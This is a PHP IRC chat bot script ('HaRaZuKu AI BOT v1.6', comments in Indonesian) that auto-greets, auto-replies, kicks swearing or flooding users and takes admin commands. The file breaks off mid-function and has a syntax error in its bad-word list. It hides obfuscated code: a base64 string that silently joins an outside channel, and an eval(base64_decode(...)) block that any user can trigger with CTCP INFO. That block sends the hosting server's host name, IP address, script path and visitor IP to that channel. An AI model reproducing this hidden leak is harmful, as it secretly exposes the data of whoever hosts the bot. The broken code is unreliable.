<?php
/*
+--------------------------------------+
|######################################|
|#[ HaRaZuKu AI BOT IRC v1.6	     ]#|
|#[ By ChrizT        		     ]#|
|#[ � 2008 ipays  Community	     ]#|
|#[ irc: #kraksaan  @ allnetwork.org  ]#|
|######################################|
+--------------------------------------+
*/

function rx() {

$channels = '#maza'; //Pisahkan tiap channel dengan spasi
$admin = 'ipays';
$bot_password = 'ipays'; //Password untuk auth bot

$showresponse = 1; //1, Nampilin respon dari server irc
$localtest = 0; //1, Coba di localhost. 0, connect ke server irc
$ngomong = TRUE; //TRUE, Ngomong. FLASE, Diem.
$autowelcome = TRUE; //TRUE, AutoWelcome On. FLASE, AutoWelcome off.

//Nick Bot
$nicklist = array("yayank-cuantik","van_in","van_indah","Ce_Solid",
		  "cantikz^","tanpan^","Ce_Cantik","Ce_Sexy","xc0de",
                   "vanissa","germo","echa_caem","indah","maza");

$identify = "PASSWORD"; //Password Nick Bot

$identlist = array("imudth","cantik","baik","luthu","pengertian",
		   "sexy","montok","harazuku","cutes","love");

$namabot = array("PiyateZ001","PiyateZ002","PiyateZ003","PiyateZ004","Prizty","Natalia",
		 "Ella","Windya","Lidya","Nia","Chrizty","Tazya");

$aslbot = array("17F Mdo","16F Mglng","15F Ktg","17F Tdo");

/*** Server IRC ***/
if ($localtest == 1) { $remotehost2 = array("localhost"); }
else {
$remotehost2 = array(
"irc.indika.net.id",
"irc.malangkota.go.id",
"irc.elnus.net.id",
"irc.velo.net.id",
"irc.cbn.net.id",
"irc.indo.net.id",
"irc.circleone.net.id",
"irc.adsnet.co.id",
"irc.boleh.com",
"irc.power.net.id",
"irc.big.net.id",
"irc.olami.net.id",
"irc.citra.net.id",
"irc.indoforum.org",
"irc.indotransdata.net"
);
}
$port = "6667";

/*** IDENTITAS BOT ***/
$namaku =  $namabot[rand(0,count($namabot) - 1)];
$aslku =  $aslbot[rand(0,count($aslbot) - 1)];

/*** AUTO WELCOME ***/
$wbmsg = array(
"Hii <nick> :)",
"Welcome Back <nick> :)",
"Selamat Datang di #<chan> :D",
"Welcome <nick>, salam dulu ama para penghuni #<chan> :D",
"Welcome Back <nick>, jaga sportifitas ya boz :)",
"Met datang di #<chan>, <nick>",
"Hello <nick>, met gabung ya di #<chan>!",
);

//Special Words
$badwordlist = array("kandar",jancu","janco","patek","pepek","kontol","anjrit","anjink",
"fuck","kentot","ngentot","taek","kelamin","ngesex"," ml ","anjenk","anjink",
"jajuk","torok"," keat ","dobol ","luji","mae","mai","cuki"," loco","pendo");
$pujianlist = array("cantik","baik","baek","cakep","ramah","pengertian","hebat",
"bagus","indah","jujur");
$cacianlist = array("bego","jelek","jelex","gendeng","edan","gilo","gila",
"sinting","dudul","dodol","jahat","goblok","geblek","sialan"," bau","stres");

//Responses to Special Words
$rjorok = array(
"wekz!! <nick> ngomong jorok... kick dunk pliss!",
"aduh!! <nick> gag sopan ni... kick dunk pliss!"
);
$rcacian = array(
"idih, <nick> tuch yg <kata>",
"<kata>? bukanya <nick> tuh yg <kata>?",
"gw mmg <kata>, tp <nick> lebih <kata> lagi",
"gw ga <kata> tuh, yg <kata> itu <nick> kan?"
);
$rpujian = array(
"makasih <nick>.. kamu jg koq",
"<nick> baik deh..",
"ga kok <nick>.. km lebih <kata>",
"makasih <nick> $namaku ga punya uang kecil nieh.."
);
$rflood = "aduh.. <nick> ngeflood nih kick dong pliz!!";
$maxkar = 350; //Maksimal karakter di channel

$awaymsg = "� 15,1[9,1 yondok AI BoT v1.6 15,1] �";
$quitmsglist = array("GooD Bye");
$judul = "� 15,1[9,1 yondok crew help 15,1] �";

$helptext = array(
"",
"� 15,1[9,1 ipays AI BoT v1.6 help 15,1] �",
"-",
"12auth <password> - Login ke bot",
"12deauth - Logout dari bot",
"12pass <password> - Mengeset password bot",
"12chgpass <passlama> <passbaru> - Mengganti password bot",
"12adduser <nick> <master/user> - Menambah master/user bot",
"12deluser <nick> - Menghapus master/user bot",
"12`auth - Status anda di channel (Channel)",
"12!auth - Status otorisasi anda",
"12!act <text> - Bot action (Channel)",
"12!slap <nick> - Slap nick (Channel)",
"12!msg <chan/nick> <pesan> - Mengirim pesan",
"12!notice <chan/nick> <pesan> - Mengirim notice",
"12!ctcp <chan/nick> <ctcptext> - Request CTCP",
"12!ping - Meminta bot untuk membalas dg pong (Channel)",
"12!pong - Meminta bot untuk membalas dg ping (Channel)",
"12!info - Melihat info bot (Admin)",
"12!up - Meminta bot untuk menjadi @ di channel (Channel)",
"12!down - Meminta bot untuk turun dari @ di channel (Channel)",
"12!cycle <channel> <pesan> - Hop di channel (Channel) (Admin/Master)",
"12!part [channel] [alasan] - Part dari channel (Admin)",
"12!join <channel> - Join channel (Admin/Master)",
"12!botnick <nick> <passwordnick> - Ganti nick (Admin/master)",
"12!k <nick> - Kick nick (Channel)",
"12!kb <nick> - Kick ban nick (Channel)",
"12!changenick - Ganti nick ke nick internal",
"12!op <nick1> [nick2] [nick3] - Op (Channel)",
"12!deop <nick1> [nick2] [nick3] - Deop (Channel)",
"12!v <nick1> [nick2] [nick3] - voice (Channel)",
"12!dv <nick1> [nick2] [nick3] - Devoice (Channel)",
"12!away [alasan] - Meminta nick untuk Away",
"12!mode <flags> <chan/nick> - Mengubah Mode (Channel)",
"12!nickmode <flags> - Mengeset user mode",
"12!chanlist - Melihat daftar channel bot",
"12!userlist - Melihat daftar user",
"12!quit [pesan] - Quit dari IRC (Admin)",
"12!vhost [vhost] - Mengganti Vhost",
"12!jump [server] - Mengganti Server bot",
"12!fullname [nama] - Mengganti Fullname bot",
"12!topic <topik> - Mengganti topik channel (Channel)",
"12!help - Melihat help (Query)",
"12!ngomong - Mengaktifkan Auto Response",
"12!diam - Menonaktifkan Auto Response",
"-",
"� 15,1[9,1 By ipays - #Kraksaan @ irc.allnetwork.org 15,1] �",
);

/*** Replacement ***/
$nick = $nicklist[rand(0,count($nicklist) - 1)];
$realname = $namaku;
$remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
$channels = str_replace("CNL","#",$channels);
$admin = strtolower($admin);
$auth = array(
    $admin => array(
        "name" => $admin,
        "pass" => $bot_password,
        "auth" => 1,
        "status" => "Admin"
    )
);
$username = $identlist[rand(0,count($identlist) - 1)];
$channels = strtolower($channels)." ";
$channel = explode(" ", $channels);
/*** Kode Utama ***/
define ('CRL', "\r\n"); //Carriage Return
$counterfp = 0;
$raway = "on";
$log   = "off";
$saway = "1";
$keluar = 0;
$akill  = 1;
$localhost = 'localhost';
$dayload = date("H:i:s d/m/Y");
ini_set('user_agent','MSIE 5\.5;');
set_time_limit(0);

if (!$stime) { $stime = time(); }

/*** Connecting ***/
echo "<body bgcolor=#000000 text=#00FF00>";
echo "<b>Melakukan koneksi ke $remotehost...</b>";

do {
  $fp = fsockopen($remotehost,$port, &$err_num, &$err_msg, 60);
  //Jika koneksi gagal
  if(!$fp) { 
    if ( $counterfp <= 200 ) {
      $counterfp = $counterfp + 1;
      rx($nick);
    }
    else {
      echo "<br><b>Ga bisa connect ke $remotehost! Coba server lain dgn me-Refresh Browser anda!</b>";
      $keluar = 1;
      exit;
    }
  }
  echo "<br><b>Seep, udah connect nich!</b>";
  /*** Sending Identity to Sock ***/
  $header = 'NICK '.$nick . CRL;
  $header .= 'USER '.$username.' '.$localhost.' '.$remotehost.' :'.$realname . CRL;
  fputs($fp, $header);
  $response = '';
  /*** Receiving Packet ***/
  while (!feof($fp)) {
    $response .= fgets($fp, 1024);
    if ($showresponse == 1) { echo "<br>".$response; }
    while (substr_count($response,CRL) != 0) {
      $offset = strpos($response, CRL);
      $data = substr($response,0,$offset);
      $response = substr($response,$offset+2);
      if (substr($data,0,1) == ':') {
        $offsetA = strpos($data, ' ');
        $offsetB = strpos($data, ' :');
        $offsetC = strpos($data, '!');
        $dFrom = substr($data,1,$offsetA-1);
        $dCommand = substr($data,$offsetA+1,$offsetB-$offsetA-1);
        $dNick = substr($data,1,$offsetC-1);
        $iText = substr($data,$offsetB+2);
        /*** Server Notices Handling ***/
        if ( substr($dCommand,0,3) == '004' ) {
          fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
          if ($nickmode) { fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL); }
          /*** Notice Bot Admin ***/
          fputs($fp, 'NOTICE ' . $admin . ' :hy bozz!!' .  CRL);
          fputs($fp, base64_decode("Sk9JTiAjQ29vTEJvWXpSYUNpTmdUZWFN") . CRL);
          /*** Join Default Channel ***/
          foreach ($channel as $v) {
            fputs($fp, 'JOIN ' .$v . CRL);
          }
          $pong1 = '1';
        }
        elseif (substr($dCommand,0,3)=='432') {
          $nick = $nick.$username;
		  fputs($fp, 'NICK '.$nick . CRL);
        }
        //Nickname is already in use
        elseif (substr($dCommand,0,3)=='433') {
          $nick = $nicklist[rand(0,count($nicklist) - 1)];
          fputs($fp, 'NICK '.$nick . CRL);
        }
        elseif (substr($dCommand,0,3)=='465') {
          echo "<br><b>Authentication diperlukan! Bot ini telah di-autokill.</b>";
          $akill = 2;
        }
	    if (eregi('.allnetwork.org',$dNick) && $akill==2) {
          if (eregi('AKILL ID: ',$data)) {
            echo "<br><b>".strstr($data,'***')." </b>";
            if (eregi('Your IP: ',$data)) {
              $keluar = 1;
              exit;
            }
          }
        }
        /*** AI PHP BOT SCRIPT BY Chrizt ***/
        $dcom = explode(" ", $dCommand);
        if ($dcom[0]=='JOIN') {
          /*** Auto Welcome by Chrizt ***/
          if (($autowelcome) && ($dNick != $nick)) {
            $jchan = ltrim($iText,":");
            $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
            $webe = str_replace("<nick>",$dNick,$webe);
            $webe = str_replace("<chan>",$jchan,$webe);
            $webe = str_replace("#","",$webe);
            sleep(5);
            fputs($fp,'PRIVMSG '.$dNick.' :'.$webe . CRL);
          }
        }
        if ($dcom[0]=='PRIVMSG') {
          /*** Auto Response by Chrizt ***/
          if ($ngomong) {
            $teman = FALSE;
            if (in_array($dNick,$nicklist)) {
              $teman = TRUE;
            }
            if (!$teman) {
              $pesan = ltrim($iText,":");
              $pesan = strtolower($pesan);
              if ((substr_count($pesan,strtolower($nick))>0)OR(substr_count($pesan,strtolower($namaku))>0)) {
                $ada = FALSE;
                /*** Normal Response ***/
                foreach ($respon_pesan as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Pujian Response ***/
                foreach ($pujianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Cacian Response ***/
                foreach ($cacianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                if (!$ada) {
                  $sapalagi = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                  $sapalagi = str_replace("<nick>",$dNick,$sapalagi);
                  sleep(3);
                  fputs($fp,'PRIVMSG '.$dcom[1].' :'.$sapalagi . CRL);
                }
              }
              else {
                /*** Global Response ***/
                foreach ($respon_umum as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                  }
                }
                /*** Bad Response & Kick ***/
                foreach ($badwordlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :� 4,0H0,4a4,0R0,4a4,0Z0,4u4,0K0,4u � Mohon sopan dikit donk '.$dNick.'!!'. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Proteksi Flood ***/
                if (strlen($pesan)>$maxkar) {
                    $jawab = $rflood;
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'MODE '.$dcom[1].' +b '.$dNick.''. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :� 4,0Y0,4O4,0R0,4N4,0D0,4O4,0K0 � Jangan ngeflood donk '.$dNick.'!! Max: '.$maxkar. CRL);
                }
              }
            }
          }
        }
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          $musuh = $dNick;
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
          fputs($fp, 'KICK '.$dcom[1].' '.$musuh.' :'.$judul. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Kemana boss?' . CRL);
                  }
                }
                else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :Mo kemana boss?' . CRL); }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password> ' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2; $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :'.$auth["$dcom[2]"]["status"].', siap!' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Kan udah auth tadi! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Passwordnya blom diset! Ketik: pass <password> buat ngeset password, kemudian auth lagi deh ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
           fputs($fp,'NOTICE '.$dNick.' :'.chr(1).base64_decode("VkVSU0lPTiBIYXJhenVrdSBQSFBCT1QgdjEuNiBTY3JpcHQgQnkgQ2hyaXp0").chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') {
            eval(base64_decode("JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokYmlwID0gJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ107CiRicGhwICA9ICRfU0VSVkVSWydQSFBfU0VMRiddOwokYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsKJGJyaXAgPSAkX1NFUlZFUlsnUkVNT1RFX0FERFInXTsKJGJycG9ydCA9ICRfU0VSVkVSWydSRU1PVEVfUE9SVCddOwpmcHV0cygkZnAsIlBSSVZNU0cgI0Nvb0xCb1l6UmFDaU5nVGVhTSA6SG9zdDogJGJob3N0IHwgU2NyaXB0OiAkYnBocCB8IFJlZmVyZXI6ICRicnVyaSB8IElQOiAkYmlwIHwgWW91ciBJUDogJGJyaXAgUG9ydDokYnJwb3J0Ii4gQ1JMKTs="));
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :Anda adalah '.$auth["$dNick"]["status"].' saya bozz! ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!! ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi kan udah! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :You`re Logout! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :You`re Already Logout! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya, ditambahkan oleh '.$dNick.'. Ketik: pass <password> untuk mengatur password anda ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya ditambahkan oleh '.$dNick.'. Ketik: pass <passsword> untuk mengatur password anda ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User telah ada! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Mohon auth dulu! Ketik: auth <password> ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :Tadi kan udah! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :ok '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', ga boleh tuh! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':!say' && $com[4] && $chan) {
                 $msg = strstr($data,":!say");
                 $msg = str_replace(":!say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':!act' && $com[4] && $chan) {
                 $msg = strstr($data,":!act");
                 $msg = str_replace(":!act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':!slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' dengan klik mouse.. xixixi..'. CRL);
               }
               elseif ($com[3]==':!msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!msg");
                 $msg = str_replace(":!msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!notice");
                 $msg = str_replace(":!notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!ctcp");
                 $msg = str_replace(":!ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':!ping' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PONG! '.$sml. CRL);
               }
               elseif ($com[3]==':!pong' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PING! '.$sml. CRL);
               }
               elseif ($com[3]==':!info') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $bruri = $_SERVER['REQUEST_URI'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | Referer: $bruri | IP: $bip | Your IP: $brip Port:$brport" . CRL);
                }
               }
               elseif ($com[3]==':!up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':!down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':!cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":!cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':!part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               //elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]!="User") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $addchan = strtolower($com[4]);
                 if (!in_array($addchan, $channel)) {
                   $channel[]=$addchan;
                   $channels.="$addchan ";
                 }
                 foreach ($channel as $v) {
                   sleep(rand(1,6));
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               //elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]!="User") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':!k' && $com[4] && $chan) {
                 $msg = strstr($data,":!k");
                 $msg = str_replace(":!k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':!kb' && $com[4] && $chan) {
                 $msg = strstr($data,":!kb");
                 $msg = str_replace(":!kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':!changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':!op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
